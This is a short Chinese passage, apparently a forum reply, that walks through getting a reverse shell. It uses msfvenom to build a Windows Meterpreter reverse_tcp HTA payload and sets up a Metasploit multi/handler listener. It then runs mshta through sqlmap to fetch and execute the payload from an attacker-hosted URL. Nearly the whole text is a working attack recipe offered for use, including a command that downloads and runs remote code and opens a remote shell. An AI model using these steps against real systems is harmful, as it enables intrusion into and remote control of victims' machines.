没关系。反弹个shell到msf  
用msfVENOM -p windows/meterpreter/reverse\_tcp lhost=msf主机ip lport=监听端口 -f hta-psh -o test.hta  
生成一个hta马  
  
use exploit/multi/handler  
set payload windows/meterpreter/reverse\_tcp  
set LHOST 你的msfIP  
set LPORT 监听的端口  
run  
  
在sqlmap执行mshta http://木马地址/test.hta
